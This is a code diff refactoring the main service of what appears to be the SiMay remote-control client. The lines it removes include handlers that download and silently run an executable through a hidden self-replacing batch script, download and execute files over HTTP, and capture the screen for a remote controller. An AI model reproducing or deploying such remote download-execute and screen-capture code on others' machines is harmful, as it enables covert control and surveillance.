@@ -1,23 +1,20 @@
-﻿using SiMay.Core;
+﻿using SiMay.Basic;
+using SiMay.Core;
+using SiMay.ModelBinder;
+using SiMay.Net.SessionProvider;
+using SiMay.Net.SessionProvider.Providers;
+using SiMay.Platform.Windows.Helper;
+using SiMay.RemoteService.Loader;
+using SiMay.Sockets.Tcp;
 using System;
-using System.Diagnostics;
+using System.Collections;
+using System.Collections.Generic;
 using System.Linq;
+using System.Net;
 using System.Text;
 using System.Threading;
-using System.Windows.Forms;
-using SiMay.Basic;
-using System.Net;
-using System.IO;
-using SiMay.ServiceCore.Attributes;
-using System.Drawing;
-using SiMay.RemoteService.Loader;
-using SiMay.ModelBinder;
-using SiMay.Platform.Windows.Helper;
-using SiMay.Net.SessionProvider;
-using SiMay.Sockets.Tcp;
-using SiMay.Net.SessionProvider.Providers;
 
-namespace SiMay.ServiceCore
+namespace SiMay.Service.Core
 {
     public class MainApplicationService : ApplicationProtocolService, IAppMainService
     {
@@ -32,9 +29,12 @@ namespace SiMay.ServiceCore
         private const int STATE_DISCONNECT = 0;
 
 
-        private int _keepStateSign = STATE_DISCONNECT;//主连接状态
+        private int _currentSessionStatus = STATE_DISCONNECT;//主连接状态
 
-        private ServiceTaskQueue _taskQueue = new ServiceTaskQueue();
+        /// <summary>
+        /// 等待分配会话序列
+        /// </summary>
+        private AwaitTaskSequence _taskAwaitSequence = new AwaitTaskSequence();
 
         /// <summary>
         /// 启动参数
@@ -51,6 +51,9 @@ namespace SiMay.ServiceCore
         /// </summary>
         public IPEndPoint RemoteIPEndPoint { get; set; }
 
+        public IDictionary<string, IRemoteSimpleService> SimpleServiceCollection
+            => SimpleServiceHelper.SimpleServiceCollection;
+
         /// <summary>
         /// 启动主服务
         /// </summary>
@@ -60,13 +63,13 @@ namespace SiMay.ServiceCore
         /// <param name="serviceIPEndPoint"></param>
         public void StartService(SessionProviderContext session)
         {
-            _keepStateSign = STATE_NORMAL;//主连接状态
+            _currentSessionStatus = STATE_NORMAL;//主连接状态
 
             this.SetSession(session);
 
             session.AppTokens = new object[2]
             {
-                SessionKind.MAIN_SERVICE,
+                SessionKind.MAIN_SERVICE_SESSION,
                 null
             };
 
@@ -137,20 +140,49 @@ namespace SiMay.ServiceCore
                         break;
                     case TcpSessionNotify.OnDataReceived:
                         var workType = (SessionKind)session.AppTokens[0];
-                        if (workType == SessionKind.MAIN_SERVICE)
+
+                        //主服务与应用服务同步调用简单程序
+                        if ((workType == SessionKind.MAIN_SERVICE_SESSION || workType == SessionKind.APP_SERVICE_SESSION) && session.GetMessageHead() == MessageHead.S_GLOBAL_SIMPLEAPP_SYNC_CALL)
+                        {
+                            var callSyncRequest = session.GetMessageEntity<CallSyncPacket>();
+                            session.CompletedBuffer = callSyncRequest.Datas;
+
+                            var maping = SimpleServiceHelper.SimpleServiceTargetHeadMaping;
+                            var messageHead = session.GetMessageHead();
+                            if (maping.TryGetValue(messageHead, out var remoteSimpleService))
+                            {
+                                var callTupleResult = this.HandlerBinder.CallFunctionPacketHandler(session, messageHead, remoteSimpleService, out var returnEntity);
+                                if (callTupleResult.successed)
+                                {
+                                    var syncResultPacket = new CallSyncResultPacket
+                                    {
+                                        Id = callSyncRequest.Id,
+                                        Datas = returnEntity.IsNull() ? Array.Empty<byte>() : SiMay.Serialize.Standard.PacketSerializeHelper.SerializePacket(returnEntity),
+                                        IsOK = callTupleResult.successed
+                                    };
+                                    session.SendTo(MessageHead.C_GLOBAL_SYNC_RESULT, syncResultPacket);
+                                }
+                            }
+                            else
+                            {
+                                LogHelper.WriteErrorByCurrentMethod($"the calling simple service messageHead:{messageHead.ConvertTo<int>()} was not found!");
+                            }
+                        }
+                        else if (workType == SessionKind.MAIN_SERVICE_SESSION)
                         {
                             var messageHead = session.GetMessageHead();
-                            this.HandlerBinder.CallFunctionPacketHandler(session, messageHead, this);
+                            var operationResult = this.HandlerBinder.CallFunctionPacketHandler(session, messageHead, this);
+                            if (!operationResult.successed)
+                                LogHelper.WriteErrorByCurrentMethod(operationResult.ex);
                         }
-                        else if (workType == SessionKind.APP_SERVICE)
+                        else if (workType == SessionKind.APP_SERVICE_SESSION)
                         {
                             var appService = session.AppTokens[1].ConvertTo<ApplicationRemoteService>();
 
                             var messageHead = session.GetMessageHead();
-                            //if (messageHead == MessageHead.S_GLOBAL_SYNC_CALL)
-                            //    appService.CallSync(session);
-                            //else
-                            appService.HandlerBinder.CallFunctionPacketHandler(session, messageHead, appService);
+                            var operationResult = appService.HandlerBinder.CallFunctionPacketHandler(session, messageHead, appService);
+                            if (!operationResult.successed)
+                                LogHelper.WriteErrorByCurrentMethod(operationResult.ex);
                         }
                         break;
                     case TcpSessionNotify.OnClosed:
@@ -180,20 +212,20 @@ namespace SiMay.ServiceCore
         private void ConnectedHandler(SessionProviderContext session, TcpSessionNotify notify)
         {
             //当服务主连接离线或未连接，优先与session关联
-            if (Interlocked.Exchange(ref _keepStateSign, STATE_NORMAL) == STATE_DISCONNECT)
+            if (Interlocked.Exchange(ref _currentSessionStatus, STATE_NORMAL) == STATE_DISCONNECT)
             {
                 session.AppTokens = new object[2]
                 {
-                    SessionKind.MAIN_SERVICE,
+                    SessionKind.MAIN_SERVICE_SESSION,
                     null
                 };
                 this.SetSession(session);
                 //服务主连接accessId保留
-                this.SendACK(session, SessionKind.MAIN_SERVICE, 0);
+                this.SendACK(session, SessionKind.MAIN_SERVICE_SESSION, 0);
             }
             else
             {
-                ApplicationRemoteService service = _taskQueue.Dequeue();
+                ApplicationRemoteService service = _taskAwaitSequence.Dequeue();
                 if (service.IsNull())
                 {
                     //找不到服务。。
@@ -202,38 +234,38 @@ namespace SiMay.ServiceCore
                 }
                 session.AppTokens = new object[2]
                 {
-                    SessionKind.APP_SERVICE,
+                    SessionKind.APP_SERVICE_SESSION,
                     service
                 };
                 service.SetSession(session);
 
-                this.SendACK(session, SessionKind.APP_SERVICE, service.AccessId);
+                this.SendACK(session, SessionKind.APP_SERVICE_SESSION, service.AccessId);
             }
 
         }
         private void CloseHandler(SessionProviderContext session, TcpSessionNotify notify)
         {
-            if (_keepStateSign == STATE_DISCONNECT && session.AppTokens.IsNull())
+            if (_currentSessionStatus == STATE_DISCONNECT && session.AppTokens.IsNull())
             {
                 //服务主连接断开或未连接
                 session.AppTokens = new object[2]
                 {
-                    SessionKind.MAIN_SERVICE,
+                    SessionKind.MAIN_SERVICE_SESSION,
                     null
                 };
             }
-            else if (_keepStateSign == STATE_NORMAL && session.AppTokens.IsNull())//task连接，连接服务器失败
+            else if (_currentSessionStatus == STATE_NORMAL && session.AppTokens.IsNull())//task连接，连接服务器失败
             {
-                _taskQueue.Dequeue();
+                _taskAwaitSequence.Dequeue();
                 return;//不重试连接，因为可能会连接不上，导致频繁重试连接
             }
 
             var workType = (SessionKind)session.AppTokens[0];
-            if (workType == SessionKind.MAIN_SERVICE)
+            if (workType == SessionKind.MAIN_SERVICE_SESSION)
             {
                 //清除主连接会话信息
                 this.SetSession(null);
-                Interlocked.Exchange(ref _keepStateSign, STATE_DISCONNECT);
+                Interlocked.Exchange(ref _currentSessionStatus, STATE_DISCONNECT);
 
                 var timer = new System.Timers.Timer();
                 timer.Interval = 5000;
@@ -247,7 +279,7 @@ namespace SiMay.ServiceCore
                 };
                 timer.Start();
             }
-            else if (workType == SessionKind.APP_SERVICE)
+            else if (workType == SessionKind.APP_SERVICE_SESSION)
             {
                 var appService = ((ApplicationRemoteService)session.AppTokens[1]);
                 if (appService.WhetherClosed)
@@ -261,307 +293,44 @@ namespace SiMay.ServiceCore
         /// 将服务加入到等待队列并发起工作连接
         /// </summary>
         /// <param name="service"></param>
-        private void PostWorkServiceToAwaitQueue(ApplicationRemoteService service)
+        private void PostToAwaitSequence(ApplicationRemoteService service)
         {
-            this._taskQueue.Enqueue(service);
+            this._taskAwaitSequence.Enqueue(service);
             this.ConnectToServer();
         }
 
         [PacketHandler(MessageHead.S_MAIN_ACTIVATE_APPLICATION_SERVICE)]
         private void ActivateApplicationService(SessionProviderContext session)
         {
-            var activateServicePack = session.GetMessageEntity<ActivateServicePack>();
-            string applicationKey = activateServicePack.CommandText.Split('.').Last<string>();
+            var activateServiceRequest = session.GetMessageEntity<ActivateServicePack>();
+            string applicationKey = activateServiceRequest.CommandText.Split('.').Last<string>();
 
             //获取当前消息发送源主控端标识
             long accessId = session.GetAccessId();
-            var context = SysUtil.ServiceTypes.FirstOrDefault(x => x.ServiceKey.Equals(applicationKey));
+            var context = SysUtil.RemoteServiceTypes.FirstOrDefault(x => x.RemoteServiceKey.Equals(applicationKey));
             if (!context.IsNull())
             {
-                var serviceName = context.ApplicationServiceType.GetCustomAttribute<ServiceNameAttribute>(true);
-                SystemMessageNotify.ShowTip($"正在进行远程操作:{(serviceName.IsNull() ? context.ServiceKey : serviceName.Name) }");
-                var applicationService = Activator.CreateInstance(context.ApplicationServiceType, null) as ApplicationRemoteService;
-                applicationService.ApplicationKey = context.ServiceKey;
-                applicationService.ActivatedCommandText = activateServicePack.CommandText;
+                var serviceName = context.RemoteServiceType.GetCustomAttribute<ServiceNameAttribute>(true);
+                SystemMessageNotify.ShowTip($"正在进行远程操作:{(serviceName.IsNull() ? context.RemoteServiceKey : serviceName.Name) }");
+                var applicationService = Activator.CreateInstance(context.RemoteServiceType, null) as ApplicationRemoteService;
+                applicationService.ApplicationKey = context.RemoteServiceKey;
+                applicationService.ActivatedCommandText = activateServiceRequest.CommandText;
                 applicationService.AccessId = accessId;
-                this.PostWorkServiceToAwaitQueue(applicationService);
+                this.PostToAwaitSequence(applicationService);
             }
         }
 
-        [PacketHandler(MessageHead.S_MAIN_REMARK)]
-        private void SetDesInfo(SessionProviderContext session)
-        {
-            var des = session.GetMessage().ToUnicodeString();
-            AppConfiguartion.RemarkInfomation = des;
-        }
-
-        [PacketHandler(MessageHead.S_MAIN_GROUP)]
-        private void SetGroupName(SessionProviderContext session)
-        {
-            var groupName = session.GetMessage().ToUnicodeString();
-            AppConfiguartion.GroupName = groupName;
-        }
-
-        [PacketHandler(MessageHead.S_MAIN_SESSION)]
-        private void SetSystemSession(SessionProviderContext session)
-            => SystemHelper.SetSessionStatus(session.GetMessage()[0]);
-
-
-        [PacketHandler(MessageHead.S_MAIN_RELOADER)]
-        private void ReLoader(SessionProviderContext session)
-            => Application.Restart();
-
-
-        [PacketHandler(MessageHead.S_MAIN_UPDATE)]
-        private void UpdateService(SessionProviderContext session)
-        {
-            try
-            {
-                var pack = session.GetMessageEntity<RemoteUpdatePacket>();
-
-                string tempFile = this.GetTempFilePath(".exe");
-                if (pack.UrlOrFileUpdate == RemoteUpdateType.File)
-                {
-                    using (var stream = File.Open(tempFile, FileMode.Create, FileAccess.Write))
-                    {
-                        stream.Seek(0, SeekOrigin.Begin);
-                        stream.Write(pack.FileDate, 0, pack.FileDate.Length);
-                    }
-                }
-                else if (pack.UrlOrFileUpdate == RemoteUpdateType.Url)
-                {
-                    using (WebClient c = new WebClient())
-                    {
-                        c.Proxy = null;
-                        c.DownloadFile(pack.DownloadUrl, tempFile);
-                    }
-                }
-
-                if (File.Exists(tempFile) && new FileInfo(tempFile).Length > 0)
-                {
-                    var batchFile = CreateBatch(Application.ExecutablePath, tempFile);
-                    if (!batchFile.IsNullOrEmpty())
-                    {
-                        ProcessStartInfo startInfo = new ProcessStartInfo
-                        {
-                            WindowStyle = ProcessWindowStyle.Hidden,
-                            UseShellExecute = true,
-                            FileName = batchFile
-                        };
-                        Process.Start(startInfo);
-
-                        Environment.Exit(0);//退出程序
-                    }
-                    else
-                    {
-                        LogHelper.WriteErrorByCurrentMethod("远程更新失败，更新脚本创建失败!");
-                    }
-                }
-                else
-                {
-                    LogHelper.WriteErrorByCurrentMethod("远程更新失败，服务端文件不存在!");
-                }
-            }
-            catch (Exception ex)
-            {
-                LogHelper.WriteErrorByCurrentMethod(ex);
-            }
-
-            string CreateBatch(string currentFilePath, string newFilePath)
-            {
-                try
-                {
-                    string tempFilePath = this.GetTempFilePath(".bat");
-
-                    string updateBatch =
-                        "@echo off" + "\r\n" +
-                        "chcp 65001" + "\r\n" +
-                        "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
-                        "ping -n 10 localhost > nul" + "\r\n" +
-                        "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
-                        "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + currentFilePath + "\"" + "\r\n" +
-                        "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
-                        "del /a /q /f " + "\"" + tempFilePath + "\"";
-
-                    File.WriteAllText(tempFilePath, updateBatch, new UTF8Encoding(false));
-                    return tempFilePath;
-                }
-                catch (Exception)
-                {
-                    return string.Empty;
-                }
-            }
-        }
-
-        private string GetTempFilePath(string extension)
-        {
-            string tempFilePath;
-            do
-            {
-                tempFilePath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + extension);
-            } while (File.Exists(tempFilePath));
-
-            return tempFilePath;
-        }
-
-        [PacketHandler(MessageHead.S_MAIN_HTTPDOWNLOAD)]
-        private void HttpDownloadExecute(SessionProviderContext session)
-            => AppDownloaderHelper.DownloadFile(session.GetMessage());
-
-
-        [PacketHandler(MessageHead.S_MAIN_OPEN_WEBURL)]
-        private void OpenUrl(SessionProviderContext session)
-        {
-            try
-            {
-                Process.Start(session.GetMessage().ToUnicodeString());
-            }
-            catch { }
-        }
-
-        //[PacketHandler(MessageHead.S_MAIN_CREATE_DESKTOPVIEW)]
-        //private void CreateDesktopView(SessionProviderContext session)
-        //{
-        //    //var isConstraint = GetMessage(session)[0];
-        //    AppConfiguartion.IsOpenScreenView = true;
-        //    //if (!_screenViewIsAction || isConstraint == 0)
-        //    this.OnRemoteCreateDesktopView();
-        //}
-
-        /// <summary>
-        /// 发送桌面下一帧
-        /// </summary>
-        /// <param name="session"></param>
-        [PacketHandler(MessageHead.S_MAIN_DESKTOPVIEW_GETFRAME)]
-        private void SendNextFrameDesktopView(SessionProviderContext session)
-        {
-            //ThreadHelper.ThreadPoolStart(c =>
-            //{
-            //var args = c.ConvertTo<object[]>();
-            //var accessId = args[0].ConvertTo<long>();
-            var getView = session.GetMessageEntity<DesktopViewGetFramePacket>();
-            if (getView.Width == 0 || getView.Height == 0 /*|| get.TimeSpan == 0 || get.TimeSpan < 50*/)
-                return;
-
-            //Thread.SetData(Thread.GetNamedDataSlot("AccessId"), accessId);
-
-            //Thread.Sleep(get.TimeSpan);
-
-            session.SendTo(MessageHead.C_MAIN_DESKTOPVIEW_FRAME,
-                    new DesktopViewFramePack()
-                    {
-                        //InVisbleArea = get.InVisbleArea,
-                        ViewData = ImageExtensionHelper.CaptureNoCursorToBytes(new Size(getView.Width, getView.Height))
-                    });
-
-            //session.SendTo(SysMessageConstructionHelper.WrapAccessId(data, accessId));
-            //}, new object[] { GetAccessId(session), session.GetMessageEntity<DesktopViewGetFramePack>() });
-        }
-        //[PacketHandler(MessageHead.S_MAIN_DESKTOPVIEW_CLOSE)]
-        //private void CloseDesktopView(SessionProviderContext session)
-        //    => AppConfiguartion.IsOpenScreenView = false;
-
-        //[PacketHandler(MessageHead.S_MAIN_DESKTOPRECORD_OPEN)]
-        //private void StartDesktopRecord(SessionProviderContext session)
-        //{
-        //    var getframe = session.GetMessageEntity<DesktopRecordGetFramePack>();
-        //    _screen_record_height = getframe.Height;
-        //    _screen_record_width = getframe.Width;
-        //    _screen_record_spantime = getframe.TimeSpan;
-
-        //    if (_screen_record_height <= 0 || _screen_record_width <= 0 || _screen_record_spantime < 500)
-        //        return;
-
-        //    AppConfiguartion.ScreenRecordHeight = _screen_record_height;
-        //    AppConfiguartion.ScreenRecordWidth = _screen_record_width;
-        //    AppConfiguartion.ScreenRecordSpanTime = _screen_record_spantime;
-        //    AppConfiguartion.IsScreenRecord = true;
-
-        //    //主机名称作为目录名
-        //    session.SendTo(MessageHead.C_MAIN_DESKTOPRECORD_OPEN, Environment.MachineName);
-        //}
-        //[PacketHandler(MessageHead.S_MAIN_DESKTOPRECORD_CLOSE)]
-        //private void DesktopRecordClose(SessionProviderContext session)
-        //    => AppConfiguartion.IsScreenRecord = false;
-
-        ///// <summary>
-        ///// 远程创建屏幕墙屏幕视图
-        ///// </summary>
-        //private void OnRemoteCreateDesktopView()
-        //{
-        //    //创建屏幕
-        //    string RemarkName = AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo;
-
-        //    SendTo(CurrentSession, MessageHead.C_MAIN_DESKTOPVIEW_CREATE,
-        //        new DesktopViewDescribePack()
-        //        {
-        //            MachineName = Environment.MachineName,
-        //            RemarkInformation = RemarkName
-        //        });
-        //}
-
-
-
-        /// <summary>
-        /// 发送下一帧屏幕记录
-        /// </summary>
-        /// <param name="width"></param>
-        /// <param name="height"></param>
-        //[PacketHandler(MessageHead.S_MAIN_DESKTOPRECORD_GETFRAME)]
-        //private void SendNextDesktopRecordFrame(SessionProviderContext session)
-        //{
-
-        //    ThreadPool.QueueUserWorkItem((o) =>
-        //    {
-        //        if (_screen_record_width == 0 || _screen_record_height == 0)
-        //            return;
-
-        //        Thread.Sleep(_screen_record_spantime);
-
-        //        session.SendTo(MessageHead.C_MAIN_DESKTOPRECORD_FRAME, ImageExtensionHelper.CaptureNoCursorToBytes(new Size(_screen_record_width, _screen_record_height)));
-        //    });
-        //}
-
-        [PacketHandler(MessageHead.S_MAIN_MESSAGEBOX)]
-        private void ShowMessageBox(SessionProviderContext session)
-        {
-            var msg = session.GetMessageEntity<MessagePacket>();
-            ThreadHelper.CreateThread(() =>
-            {
-                string title = msg.MessageTitle;
-                string cont = msg.MessageBody;
-
-                switch ((MessageIconKind)msg.MessageIcon)
-                {
-                    case MessageIconKind.Error:
-                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
-                        break;
-
-                    case MessageIconKind.Question:
-                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
-                        break;
-
-                    case MessageIconKind.InforMation:
-                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
-                        break;
-
-                    case MessageIconKind.Exclaim:
-                        MessageBox.Show(cont, title, 0, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
-                        break;
-                }
-            }, true);
-        }
         /// <summary>
         /// 发送上线包
         /// </summary>
         [PacketHandler(MessageHead.S_GLOBAL_OK)]
         private void SendLoginPack(SessionProviderContext session)
         {
-            var loginResult = GatherLoginPacketBuilder();
+            var loginResult = LoginPacketBuilder();
             session.SendTo(MessageHead.C_MAIN_LOGIN, loginResult);
         }
 
-        private LoginPacket GatherLoginPacketBuilder(bool assemblyLoadCompleted = false)
+        private LoginPacket LoginPacketBuilder(bool assemblyLoadCompleted = false)
         {
             string remarkInfomation = AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo;
             string groupName = AppConfiguartion.GroupName ?? AppConfiguartion.DefaultGroupName;
